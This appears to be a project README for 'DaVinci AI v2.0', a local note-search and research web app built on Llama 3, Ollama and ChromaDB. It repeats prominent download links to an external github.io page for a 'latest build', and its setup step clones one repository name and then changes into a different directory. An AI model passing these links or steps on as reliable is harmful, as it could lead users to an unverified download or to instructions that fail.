# DaVinci AI v2.0 - Local AI Knowledge Assistant and Research Platform 2026

> **DaVinci AI is a local web application for finding, analyzing, and researching personal notes and documents with retrieval-augmented generation. Version 2.0 is now available.**

[![Platform](https://img.shields.io/badge/Platform-Local%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandongreenhc1561/davinci-ai-document-research?style=flat-square)](https://github.com/brandongreenhc1561/davinci-ai-document-research)

---

<p align="center">
  <a href="https://brandongreenhc1561.github.io/davinci-ai-document-research/">
    <img src="https://img.shields.io/badge/Download-DaVinci%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download DaVinci AI">
  </a>
</p>

> **[Download DaVinci AI v2.0](https://brandongreenhc1561.github.io/davinci-ai-document-research/)**

---

[Download Latest Build](https://brandongreenhc1561.github.io/davinci-ai-document-research/)

---

## Overview

DaVinci AI applies local retrieval-augmented generation to personal knowledge management and research. It indexes Obsidian vaults, Markdown collections, and widely used document types, allowing users to discover relevant content, follow relationships between sources, and query their own information.

Its research workflow brings together semantic retrieval, document analysis, and online investigation. Local Llama 3 processing via Ollama works alongside ChromaDB vector storage and background task execution, supporting movement between private notes, uploaded files, search engines, and Wikipedia.

---

## Capabilities

- Ask questions across private notes and other indexed knowledge while keeping processing local
- Automatically index Obsidian vaults and Markdown files as content changes
- Work with PDF, DOCX, and TXT documents
- Explore individual documents through interactive questions and contextual retrieval
- Search by meaning with ChromaDB-backed vector storage
- Run Llama 3 locally using Ollama
- Route research by intent across search engines and Wikipedia
- Discover and scrape relevant web content through autonomous research workflows
- Maintain long-running research jobs with Huey and SQLite
- Use React and Next.js interfaces suited to different interaction patterns

---

## Getting Started

First clone the repository and switch to the project directory:

```bash
git clone https://github.com/brandongreenhc1561/davinci-ai-document-research.git
cd davinci-document-analyser
```

DaVinci AI runs as a web application on the local machine. Install the dependencies, configure the local Ollama model, and set up the supporting services described in the repository. Then launch the available web application entry point.

Once the application is running, visit the local URL displayed by the server in your browser.

---

## Typical Workflow

The basic process is:

1. Launch DaVinci AI together with the services it requires.
2. Choose or connect an Obsidian vault, Markdown directory, or supported document source.
3. Let the indexer read and process the source files.
4. Use semantic search to query the indexed collection.
5. Ask questions about a particular document or the complete knowledge base.
6. Create a research task when online investigation is also required.
7. Examine the retrieved excerpts and research output in the web interface.

Example requests include:

- Locate notes associated with a particular subject.
- Produce a summary of a PDF or DOCX document.
- Contrast information found in multiple indexed files.
- Research a question using personal notes, search engines, and Wikipedia.

---

## Settings and Configuration

The exact configuration varies according to the interface in use and the services running locally. Before starting the system for the first time, consult the repository configuration and startup documentation, paying particular attention to:

- The Ollama service and local Llama 3 model
- ChromaDB data storage
- SQLite and Huey task processing
- Directories containing Obsidian or Markdown sources
- Indexing and research options
- The host and port used by the web application

Local paths and service configuration must match the machine and environment hosting DaVinci AI.

---

## System Requirements

- A computer able to run a local web application
- Compatible Python and JavaScript runtimes for the Flask, React, and Next.js components
- Ollama configured with access to a Llama 3 model for local inference
- Enough storage for source files, indexed documents, vector data, and background research state
- Supported source content, including Obsidian notes, Markdown, PDF, DOCX, or TXT files
- Network connectivity for web discovery, search engine queries, and Wikipedia-based research

---

## Frequently Asked Questions

### Which file types can be indexed?

DaVinci AI can process Obsidian and Markdown files, as well as PDF, DOCX, and TXT documents.

### Is a cloud-hosted language model required?

No remote model is described in the documented workflow. Inference is performed locally with Llama 3 through Ollama.

### Can the system answer questions about a single file?

Yes. Indexed documents can be queried interactively through the document analysis workflow.

### What happens during a research task?

A research task can combine retrieval from local sources with intent-directed discovery through search engines and Wikipedia. Huey and SQLite handle the background work.

### Where do I change the application settings?

Use the repository's configuration and startup files to find options for source paths, model configuration, storage locations, and web server behavior.

### What should I inspect if indexing misses files?

Check that the configured source directories are reachable, the files use supported formats and can be read, the indexing process is active, and ChromaDB storage is available. If the problem appears related to inference, confirm that Ollama is running and that the intended Llama 3 model is selected.

### How do I receive updates?

Download the repository's latest build or update the local checkout. Before restarting, read any accompanying release or setup instructions.

---

## License

DaVinci AI is licensed under GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
